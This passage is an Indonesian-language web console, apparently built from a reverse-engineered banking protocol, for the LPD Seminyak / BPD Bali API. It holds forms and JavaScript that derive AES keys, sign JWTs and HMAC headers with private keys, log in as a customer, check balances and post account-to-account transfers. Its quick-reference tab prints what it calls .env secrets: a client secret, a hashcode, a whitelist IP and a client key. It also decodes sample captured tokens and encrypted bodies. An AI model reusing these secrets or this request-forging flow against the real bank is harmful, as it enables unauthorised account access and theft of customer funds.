      <button class="btn btn-secondary" onclick="slShowCurl()" title="Tampilkan curl command yang akan dikirim"><i class="fas fa-terminal"></i> Preview Curl</button>
    </div>
    <div id="result-smart-login" class="result-box"></div>

    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Flow otomatis (sesuai POC sukses):</span><br>
      <span class="cmd">1. MD5(user_name)  \u2192  user_name hashed (32 hex)</span><br>
      <span class="cmd">2. MD5(user_pass)  \u2192  user_pass hashed (32 hex)</span><br>
      <span class="cmd">3. createJWT(refNo, tsISO, priv_lpd)  \u2192  Authorization header</span><br>
      <span class="cmd">4. generateSignature(jwt, ts, aesCs)  \u2192  X-SIGNATURE & X-PARTNER-ID</span><br>
      <span class="cmd">5. POST /api/smart/access/login  \u2192  status:"00" + account_list</span><br>
      <span class="comment"># Catatan: Body TIDAK di-AES-encrypt. Hanya header yang perlu AES CS.</span><br>
    </div>
  </div>
</div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SMART: CEK SALDO -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-smart-saldo" class="section">
<div class="content">
<div id="smart-saldo-session" class="session-box" style="display:none">
  <div class="session-title"><span class="badge-live"><span class="dot"></span>Sesi Aktif</span></div>
  <div class="session-field"><span class="sf-label">Status</span><span class="sf-val" id="saldo-token-preview">\u2014</span></div>
</div>
<div id="smart-saldo-noauth" class="info-box info-red">
  <i class="fas fa-exclamation-triangle"></i>
  <div>Belum login. Silakan <a href="#" onclick="showTab('smart-login');return false" style="color:#fca5a5;font-weight:700">Login Nasabah</a> terlebih dahulu untuk mendapatkan token.</div>
</div>

<div class="panel">
  <div class="panel-header">
    <i class="fas fa-wallet" style="color:#34d399"></i>
    <h3>Cek Saldo</h3>
    <span class="badge" style="background:#022c22;color:#6ee7b7">POST /api/smart/account/balance</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-green">
      <i class="fas fa-info-circle"></i>
      <div>Nomor rekening akan dienkripsi AES-256-CBC sebelum dikirim. JWT &amp; signature dibuat ulang otomatis dari private key LPD tiap request.</div>
    </div>
    <div class="field-row">
      <label>Nomor Rekening</label>
      <input type="text" id="sb-norek" placeholder="0100001234"/>
    </div>
    <div class="btn-group">
      <button class="btn btn-green" id="sb-btn" onclick="smartSaldo(this)"><i class="fas fa-search"></i> Cek Saldo</button>
    </div>
    <div id="result-smart-saldo" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Endpoint:</span><br>
      <span class="cmd">POST /api/smart/account/balance</span><br>
      <span class="cmd">Body: { no_rek: aesEncrypt(norek) }</span><br>
    </div>
  </div>
</div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SMART: TRANSFER -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-smart-transfer" class="section">
<div class="content">
<div id="smart-tf-session" class="session-box" style="display:none">
  <div class="session-title"><span class="badge-live"><span class="dot"></span>Sesi Aktif</span></div>
  <div class="session-field"><span class="sf-label">Status</span><span class="sf-val" id="tf-token-preview">\u2014</span></div>
</div>
<div id="smart-tf-noauth" class="info-box info-red">
  <i class="fas fa-exclamation-triangle"></i>
  <div>Belum login. Silakan <a href="#" onclick="showTab('smart-login');return false" style="color:#fca5a5;font-weight:700">Login Nasabah</a> terlebih dahulu.</div>
</div>

<div class="panel">
  <div class="panel-header">
    <i class="fas fa-exchange-alt" style="color:#f59e0b"></i>
    <h3>Transfer Antar Rekening</h3>
    <span class="badge" style="background:#1c1200;color:#fbbf24">Inquiry \u2192 Posting</span>
  </div>
  <div class="panel-body">

    <!-- Transfer steps -->
    <div class="step-indicator" id="tf-step-indicator">
      <div class="step active" id="tf-step1"><i class="fas fa-search"></i> 1. Inquiry</div>
      <span class="step-arrow">\u203A</span>
      <div class="step" id="tf-step2"><i class="fas fa-check-circle"></i> 2. Konfirmasi</div>
      <span class="step-arrow">\u203A</span>
      <div class="step" id="tf-step3"><i class="fas fa-paper-plane"></i> 3. Posting</div>
    </div>

    <!-- Panel inquiry -->
    <div id="tf-panel-inquiry">
      <h4 style="font-size:12px;font-weight:700;color:#fbbf24;margin-bottom:12px"><i class="fas fa-search"></i> Inquiry Transfer</h4>
      <div class="info-box info-yellow">
        <i class="fas fa-info-circle"></i>
        <div>Inquiry untuk mengecek ketersediaan rekening tujuan dan nominal. Semua field dienkripsi sebelum dikirim.</div>
      </div>
      <div class="grid-2">
        <div class="field-row">
          <label>No. Rekening Asal</label>
          <input type="text" id="tf-from" placeholder="0100001234"/>
        </div>
        <div class="field-row">
          <label>No. Rekening Tujuan</label>
          <input type="text" id="tf-to" placeholder="0100005678"/>
        </div>
      </div>
      <div class="grid-2">
        <div class="field-row">
          <label>Nominal (angka, tanpa titik/koma)</label>
          <input type="number" id="tf-nominal" class="amount-input" placeholder="500000" min="1"/>
        </div>
        <div class="field-row">
          <label>Kode Bank Tujuan (opsional)</label>
          <input type="text" id="tf-bank" placeholder="008 (Mandiri), kosong jika intrabank"/>
        </div>
      </div>
      <div class="btn-group">
        <button class="btn btn-primary" style="background:linear-gradient(135deg,#d97706,#b45309)" id="tf-inquiry-btn" onclick="smartInquiry(this)"><i class="fas fa-search"></i> Inquiry</button>
      </div>
      <div id="result-smart-inquiry" class="result-box"></div>
    </div>

    <!-- Panel konfirmasi (tampil setelah inquiry berhasil) -->
    <div id="tf-panel-confirm" style="display:none">
      <div class="divider"></div>
      <h4 style="font-size:12px;font-weight:700;color:#f59e0b;margin-bottom:12px"><i class="fas fa-check-circle"></i> Konfirmasi Transfer</h4>
      <div class="confirm-box">
        <div class="confirm-row"><span class="confirm-label">Dari Rekening</span><span class="confirm-value" id="cf-from">\u2014</span></div>
        <div class="confirm-row"><span class="confirm-label">Ke Rekening</span><span class="confirm-value" id="cf-to">\u2014</span></div>
        <div class="confirm-row"><span class="confirm-label">Nominal</span><span class="confirm-value" id="cf-nominal" style="font-size:16px;color:#fbbf24">\u2014</span></div>
        <div class="confirm-row"><span class="confirm-label">Bank Tujuan</span><span class="confirm-value" id="cf-bank">\u2014</span></div>
        <div class="confirm-row"><span class="confirm-label">Ref. Inquiry</span><span class="confirm-value" id="cf-ref">\u2014</span></div>
      </div>
      <div class="field-row">
        <label>Nama Penerima (opsional)</label>
        <input type="text" id="tf-nama-dest" placeholder="Nama rekening tujuan"/>
      </div>
      <div class="field-row">
        <label>Keterangan / Berita Transfer (opsional)</label>
        <input type="text" id="tf-ket" placeholder="Pembayaran tagihan, dll"/>
      </div>
      <div class="btn-group">
        <button class="btn btn-secondary" onclick="tfReset()"><i class="fas fa-arrow-left"></i> Ubah Data</button>
        <button class="btn btn-primary" style="background:linear-gradient(135deg,#dc2626,#b91c1c)" id="tf-posting-btn" onclick="smartPosting(this)"><i class="fas fa-paper-plane"></i> Posting Transfer</button>
      </div>
      <div id="result-smart-posting" class="result-box"></div>
    </div>

    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Flow Transfer:</span><br>
      <span class="cmd">1. POST /api/smart/transfer/inquiry   \u2192  cek rekening &amp; saldo</span><br>
      <span class="cmd">2. Konfirmasi data oleh user</span><br>
      <span class="cmd">3. POST /api/smart/transfer/posting   \u2192  eksekusi transfer</span><br>
      <span class="comment"># Semua field dienkripsi AES-256-CBC, JWT &amp; signature otomatis</span><br>
    </div>
  </div>
</div>
</div>
</section>

<!-- QUICK REF -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-quick-ref" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-book" style="color:#a78bfa"></i>
    <h3>Referensi Cepat</h3>
  </div>
  <div class="panel-body">
    <h4 style="font-size:13px;font-weight:700;margin-bottom:10px;color:#a78bfa">Konstanta dari .env</h4>
    <div class="stat-row"><div class="stat-key">BPD_HASHCODE</div><div class="stat-val">p91wrswK</div></div>
    <div class="stat-row"><div class="stat-key">CLIENT_SECRET</div><div class="stat-val">7vCjkNHs</div></div>
    <div class="stat-row"><div class="stat-key">CLIENT_VA</div><div class="stat-val">VA-325</div></div>
    <div class="stat-row"><div class="stat-key">WHITELIST_IP</div><div class="stat-val">34.50.74.78</div></div>
    <div class="stat-row"><div class="stat-key">BPD_PREFIX</div><div class="stat-val">989191</div></div>
    <div class="stat-row"><div class="stat-key">X-CLIENT-KEY (SNAP)</div><div class="stat-val">LPD-SEMINYAK-001</div></div>

    <div class="divider"></div>
    <h4 style="font-size:13px;font-weight:700;margin-bottom:10px;color:#a78bfa">Algoritma Enkripsi per Komponen</h4>
    <div class="stat-row"><div class="stat-key">Body fields</div><div class="stat-val"><span class="badge-algo badge-aes">AES-256-CBC</span> key/iv dari DB atau Gio_CreateKeyAndIv</div></div>
    <div class="stat-row"><div class="stat-key">X-SIGNATURE</div><div class="stat-val"><span class="badge-algo badge-hmac">HMAC-SHA512</span> base64(HMAC(token:ts, aes_cs))</div></div>
    <div class="stat-row"><div class="stat-key">X-PARTNER-ID</div><div class="stat-val"><span class="badge-algo badge-hmac">HMAC-SHA512</span> sama dengan X-SIGNATURE</div></div>
    <div class="stat-row"><div class="stat-key">hash_code (transfer)</div><div class="stat-val"><span class="badge-algo badge-sha">SHA-256</span> string dengan separators khusus</div></div>
    <div class="stat-row"><div class="stat-key">iOS token sig</div><div class="stat-val"><span class="badge-algo badge-rsa">RSA-SHA256</span> sign(SHA256("Seminyak|ts"), priv_lpd)</div></div>
    <div class="stat-row"><div class="stat-key">SNAP token sig</div><div class="stat-val"><span class="badge-algo badge-rsa">RSA-SHA256</span> sign(clientKey+"|"+ts, priv_bpd)</div></div>
    <div class="stat-row"><div class="stat-key">AES Key derivation</div><div class="stat-val"><span class="badge-algo badge-hmac">HMAC-SHA512</span> key=ts, msg=clientID \u2192 64 bytes \u2192 slice</div></div>

    <div class="divider"></div>
    <h4 style="font-size:13px;font-weight:700;margin-bottom:10px;color:#a78bfa">CLI Commands</h4>
    <div class="quick-ref" style="line-height:2.2">
      <span class="cmd">node lpd-crypto.cjs demo</span><br>
      <span class="cmd">node lpd-crypto.cjs keygen "clientID" "timestamp"</span><br>
      <span class="cmd">node lpd-crypto.cjs encrypt "plaintext" "key_b64" "iv_b64"</span><br>
      <span class="cmd">node lpd-crypto.cjs decrypt "cipher_b64" "key_b64" "iv_b64"</span><br>
      <span class="cmd">node lpd-crypto.cjs did "X-CLIENT-ID"</span><br>
      <span class="cmd">node lpd-crypto.cjs jwt "JWT_token"</span><br>
      <span class="cmd">node lpd-crypto.cjs sig "X-SIGNATURE_b64"</span><br>
      <span class="cmd">node lpd-crypto.cjs hashcode from amount datetime ref bank acc name</span><br>
      <span class="cmd">node lpd-crypto.cjs ref SMY</span>
    </div>

    <div class="divider"></div>
    <h4 style="font-size:13px;font-weight:700;margin-bottom:10px;color:#a78bfa">File Keys</h4>
    <div class="stat-row"><div class="stat-key">private_bpd_003.pem</div><div class="stat-val">Private key SNAP BPD Bali (untuk X-SIGNATURE SNAP)</div></div>
    <div class="stat-row"><div class="stat-key">private_key_lpd.pem</div><div class="stat-val">Private key LPD Seminyak (untuk iOS token sig)</div></div>
    <div class="stat-row"><div class="stat-key">keys/public_key.pem</div><div class="stat-val">Public key client (diterima server untuk verifikasi iOS)</div></div>
    <div class="stat-row"><div class="stat-key">public_key_bpd.pem</div><div class="stat-val">Public key BPD (untuk verifikasi SNAP token)</div></div>
  </div>
</div>
</section>

</div><!-- .content -->
</div><!-- #main -->

<script>
// \u2500\u2500 State \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
let lastKeygen = null;

// \u2500\u2500 Navigation \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function showTab(name) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('#sidebar nav a').forEach(a => a.classList.remove('active'));
  const sec = document.getElementById('tab-' + name);
  if (sec) sec.classList.add('active');
  const nav = document.getElementById('nav-' + name);
  if (nav) nav.classList.add('active');
  // Auto-close sidebar on mobile after nav click
  if (window.innerWidth <= 768) closeSidebar();
  // Update login banner saat pindah ke tab smart-login
  if (name === 'smart-login') {
    slPasteKeygen && slPasteKeygen();
    updateLoginBanner && updateLoginBanner();
  }
}

// \u2500\u2500 Mobile Sidebar \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function toggleSidebar() {
  const sb = document.getElementById('sidebar');
  const ov = document.getElementById('sidebar-overlay');
  if (sb.classList.contains('open')) {
    closeSidebar();
  } else {
    sb.classList.add('open');
    ov.classList.add('show');
    document.body.style.overflow = 'hidden';
  }
}

function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
  document.body.style.overflow = '';
}

// Close sidebar on resize to desktop
window.addEventListener('resize', function() {
  if (window.innerWidth > 768) closeSidebar();
});

function switchSubTab(el, group, tab) {
  const container = document.getElementById('tab-' + (group === 'hash' ? 'hashcode' : 'build-transfer'));
  container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  container.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  el.classList.add('active');
  const panel = document.getElementById(group + '-' + tab);
  if (panel) panel.classList.add('active');
  if (group === 'hash') {
    document.getElementById('hash-step').value = tab;
    const isLPD = tab === 'lpd';
    document.getElementById('hash-fields-transfer').style.display = isLPD ? 'none' : '';
    document.getElementById('hash-fields-lpd').style.display = isLPD ? '' : 'none';
  } else if (group === 'bt') {
    document.getElementById('bt-step').value = tab;
  }
}

// \u2500\u2500 Helper \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function callCrypto(payload) {
  const resp = await fetch('/api/crypto', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  return resp.json();
}

function val(id) {
  const el = document.getElementById(id);
  return el ? el.value.trim() : '';
}

function showResult(id, data, isOk) {
  const box = document.getElementById('result-' + id);
  box.className = 'result-box show';
  const statusClass = isOk ? 'result-ok' : 'result-err';
  const icon = isOk ? '\u2705' : '\u274C';
  const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
  const safeId = 'rv_' + Math.random().toString(36).slice(2);
  window[safeId] = text;
  box.innerHTML = '<div class="result-header">' +
    '<span class="' + statusClass + '">' + icon + ' ' + (isOk ? 'Berhasil' : 'Gagal') + '</span>' +
    '<button class="copy-btn" onclick="copyText(this,window.'+safeId+')"><i class="fas fa-copy"></i> Salin</button>' +
    '</div><pre class="result">' + escHtml(text) + '</pre>';
}

function escHtml(str) {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function copyText(btn, text) {
  try {
    await navigator.clipboard.writeText(text);
    btn.innerHTML = '<i class="fas fa-check"></i> Tersalin!';
    setTimeout(() => { btn.innerHTML = '<i class="fas fa-copy"></i> Salin'; }, 1500);
  } catch(e) { alert('Gagal salin: ' + e.message); }
}

function setLoading(btn, loading) {
  if (loading) {
    btn._orig = btn.innerHTML;
    btn.innerHTML = '<span class="spinner"></span> Proses...';
    btn.disabled = true;
  } else {
    btn.innerHTML = btn._orig || 'Run';
    btn.disabled = false;
  }
}

// \u2500\u2500 Fill helpers \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function fillNow(id) {
  const r = await callCrypto({ op: 'timestamp' });
  if (r.ok) document.getElementById(id).value = r.result.jakarta;
}
async function fillNowISO(id) {
  const r = await callCrypto({ op: 'timestamp' });
  if (r.ok) document.getElementById(id).value = r.result.jakartaISO;
}

function pasteFromKeygen(keyId, ivId) {
  if (!lastKeygen) { alert('Jalankan Derive AES Keys terlebih dahulu.'); return; }
  if (keyId) document.getElementById(keyId).value = lastKeygen.aesKey;
  if (ivId) document.getElementById(ivId).value = lastKeygen.aesIv;
}
function pasteFromKeygenCS(csId) {
  if (!lastKeygen) { alert('Jalankan Derive AES Keys terlebih dahulu.'); return; }
  if (csId) document.getElementById(csId).value = lastKeygen.aesCs;
}
function pasteFromKeygenTS(tsId) {
  // just fill current time
  fillNow(tsId);
}

function fillSampleDID() {
  document.getElementById('did-decode-val').value = 'U01ZU2V6F3B7BWtV[M39ZkVGUk0wRXVNalF3T1RFeUxqQXdNUzR3TVRFd01qQXlOVEU2VtaW55YWt8QVEzQS4yNDA5MTIXdJREV4T2pRME9qSXc4IT5RVkV6VVM0eU5EQTVNuMDAxLjAxMTAyXhNVEF5MURJMU1USXdNakExZkZOMDI1MTIwMjA1fDIwMjYtMDQtMjAgMTE6NDQ6MjAORFE2TWpBKCEpUTI5d2VYSnBaMmgwSU1LcElESXdNallnVUZRZ1IybHZjMjltZENCVGJXRnlkSEJ5YnlCSmJtUnZibVZ6YVdFZ0NsWmxjbk5wYjI0Z01TNHhMakY0TWpBeU5pMHdOQzB5TUNBeE1UbzBORG95TUh4QlVUTkJMakkwTURreE1pNHdNREV1TURFeE1ESXdNalV4TWpBeU1EVXkhXUNvcHlyaWdodCDCqSAyMDI2IFBUIEdpb3NvZnQgU21hcnRwcm8gSW5kb25lc2lhIApWZXJzaW9uIDEuMS4x=';
}

function fillSampleJWT() {
  document.getElementById('jwt-val').value = 'eyJ0cmFuc19ubyI6IjExMTIzLTQzNTI0LTIwMTAyLTI2ODc2IiwiYWxnIjoiUlMyNTYifQ.eyJ0cmFuc190aW1lIjoiMjAyNi0wNC0yMFQxMTo0MzoyMCswODowMCJ9.Hi4em1vt9TI-XcaWXjr4pZPdr1_8K8lNO3I5SAWOTvZoA2c-ILo-8LasRawWaUMwVVhDLFmLBofvGCLnyI4MKuOMpMpS8PRN9v7-UPc-htnglJkC4o9TDPb9qEHOU3QReAn0jROlEK5V0ThZdGLGF-Ma0bffC_IUUFtl7rzq-CpWArJF6GkH6KJNAbYgfp64On_QjGkOuhFN6qB7t5uEU_dAC-INRiiMeKZilJnSE7DcEOR-3DChdsxo6wbrL8PLHDQdHQeG-4NOPgg13JUsWzVgZFn24v0-Kk_mxgBTJ_jhY9ioCfAI7Z5VourvGsdLAYtLAcpC3NR7mZlJHp_vyQ';
}

function fillSampleBody() {
  document.getElementById('db-body').value = JSON.stringify({
    from_acc:  '5re0Z89b0k2cwoL+K1HeRQ==',
    to_acc:    'AvYW9eJGgNn7ekcnO3rcVcZEU76bgksWwQMjYKgHwptVxBFQWKyxVjM7AULzMEI6stJoXOrq+oYe0ZOx1V31jeVSWNA+9ufZtGabdKHw+aVJTUtmj4yxkMH8dQXfe4CeOLFmbnPtVSA0P43ThtPd3gKhAhz1IZ75urnc9xpsHCA=',
    amount:    'rJTsdtV8mD+Ogo2Ize6Y3g==',
    date_time: 'SRcf8pIUGi2A4D3bRlZZX8oXtNtIe3E7T1rRncMBaCc=',
    to_name:   'q7fpK0JWVKPz2ZWqxXnt5A==',
    hash_code: '3MNidoAhRMGSsi02xjJY+J1uYWhj6VDxMzHYzUwwSsUTE6v40k+jnpED0wN3m7WULe7hwqh++m0zzUt1Dt/0gMAxRQoOwz+DCUV4GJa7uyw=',
    remark: ''
  }, null, 2);
}

// \u2500\u2500 Main op dispatcher \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function runOp(e, opName) {
  const btn = e.currentTarget;
  setLoading(btn, true);
  try {
    let payload = { op: opName };

    if (opName === 'keygen') {
      payload.clientID  = val('kg-clientid');
      payload.timestamp = val('kg-ts');
    } else if (opName === 'encrypt') {
      payload.plaintext = val('enc-plain');
      payload.aesKey    = val('enc-key');
      payload.aesIv     = val('enc-iv');
    } else if (opName === 'decrypt') {
      payload.ciphertext = val('dec-cipher');
      payload.aesKey     = val('dec-key');
      payload.aesIv      = val('dec-iv');
    } else if (opName === 'decrypt-body') {
      payload.op = 'decrypt-body';
      try {
        payload.body = JSON.parse(val('db-body') || '{}');
      } catch(e) {
        showResult('decrypt-body', 'Body JSON tidak valid: ' + e.message, false);
        return;
      }
      payload.aesKey = val('db-key');
      payload.aesIv  = val('db-iv');
    } else if (opName === 'did-decode') {
      payload.did = val('did-decode-val');
    } else if (opName === 'did-encode') {
      payload.clientID  = val('die-clientid');
      payload.timestamp = val('die-ts');
      payload.appName   = val('die-app') || 'Seminyak';
    } else if (opName === 'jwt-decode') {
      payload.jwt = val('jwt-val');
    } else if (opName === 'sig-decode') {
      payload.signature = val('sigd-val');
    } else if (opName === 'signature') {
      payload.token     = val('sig-token');
      payload.timestamp = val('sig-ts');
      payload.aesCs     = val('sig-cs');
    } else if (opName === 'ios-token-sig') {
      payload.timestamp = val('ios-ts') || undefined;
    } else if (opName === 'snap-token-sig') {
      payload.clientKey = val('snap-key') || 'LPD-SEMINYAK-001';
      payload.timestamp = val('snap-ts') || undefined;
    } else if (opName === 'hashcode') {
      const step = val('hash-step');
      payload.step = step;
      if (step === 'lpd') {
        payload.nominal  = val('hc-nominal');
        payload.norekFrom = val('hc-nfrom');
        payload.norekTo  = val('hc-nto');
        payload.nameFrom = val('hc-nfromname');
        payload.nameTo   = val('hc-ntoname');
      } else {
        payload.fromAcc  = val('hc-from');
        payload.amount   = val('hc-amount');
        payload.dateTime = val('hc-dt');
        payload.refNo    = val('hc-ref');
        payload.destBank = val('hc-bank');
        payload.destAcc  = val('hc-acc');
        payload.destName = val('hc-name');
      }
    } else if (opName === 'reference') {
      payload.prefix = val('ref-prefix') || 'SMY';
      payload.count  = parseInt(val('ref-count')) || 5;
    } else if (opName === 'build-transfer') {
      payload.baseUrl    = val('bt-url') || 'https://lpdseminyak.biz.id:8000';
      payload.token      = val('bt-token');
      payload.didEncoded = val('bt-did');
      payload.aesKey     = val('bt-key');
      payload.aesIv      = val('bt-iv');
      payload.aesCs      = val('bt-cs');
      payload.fromAcc    = val('bt-from');
      payload.amount     = val('bt-amount');
      payload.destBank   = val('bt-dbank');
      payload.destAcc    = val('bt-dacc');
      payload.destName   = val('bt-dname');
      payload.dateTime   = val('bt-dt') || undefined;
      payload.refNo      = val('bt-ref') || undefined;
      payload.step       = val('bt-step');
    }

    const r = await callCrypto(payload);

    if (r.ok) {
      // Save keygen result for paste helpers
      if (opName === 'keygen') {
        lastKeygen = r.result;
        window._lastKeygen = r.result; // also for smart login

        // \u2500\u2500 AUTO: generate X-CLIENT-ID langsung setelah keygen berhasil \u2500\u2500\u2500\u2500\u2500\u2500
        var kgClientId = val('kg-clientid');
        var kgTs       = val('kg-ts');
        if (kgClientId && kgTs) {
          callCrypto({ op: 'did-encode', clientID: kgClientId, timestamp: kgTs, appName: 'Seminyak' })
            .then(function(dr) {
              if (dr.ok && dr.result && dr.result.encoded) {
                var encoded = dr.result.encoded;
                window._lastDid = encoded;
                if (window._lastKeygen) window._lastKeygen.clientIdEnc = encoded;

                // Tampilkan panel hasil X-CLIENT-ID di tab keygen
                var panel = document.getElementById('kg-did-panel');
                var out   = document.getElementById('kg-did-output');
                if (panel) panel.style.display = 'block';
                if (out)   out.value = encoded;

                // Auto-fill semua field di form login
                var elKey = document.getElementById('sl-key');
                var elIv  = document.getElementById('sl-iv');
                var elCs  = document.getElementById('sl-cs');
                var elDid = document.getElementById('sl-did');
                if (elKey && r.result.aesKey) elKey.value = r.result.aesKey;
                if (elIv  && r.result.aesIv)  elIv.value  = r.result.aesIv;
                if (elCs  && r.result.aesCs)  elCs.value  = r.result.aesCs;
                if (elDid) elDid.value = encoded;

                // Tampilkan banner & badge di form login
                var banner   = document.getElementById('sl-autofill-banner');
                var noBanner = document.getElementById('sl-no-keygen-banner');
                var badge    = document.getElementById('sl-keys-badge');
                var info     = document.getElementById('sl-autofill-info');
                var step1    = document.getElementById('sl-step1');
                if (banner)   { banner.style.display = 'flex'; }
                if (noBanner) { noBanner.style.display = 'none'; }
                if (badge)    { badge.style.display = 'inline'; }
                if (info)     { info.textContent = 'clientID: ' + kgClientId.substring(0,20) + '..., ts: ' + kgTs; }
                if (step1)    { step1.className = 'step active'; }
              }
            })
            .catch(function() { /* silent fail */ });
        }
        // \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
      }
      // Save did-encode result for smart login paste
      if (opName === 'did-encode' && r.result && r.result.encoded) {
        window._lastDid = r.result.encoded;
        // Also attach to keygen for convenience
        if (window._lastKeygen) window._lastKeygen.clientIdEnc = r.result.encoded;
      }
      // Special formatting for build-transfer: show curl command
      if (opName === 'build-transfer' && r.result) {
        const res = r.result;
        const curlLines = buildCurl(res);
        showResult('build-transfer', curlLines, true);
      } else if (opName === 'reference' && r.result && r.result.references) {
        showResult('reference', r.result.references.join(String.fromCharCode(10)), true);
      } else {
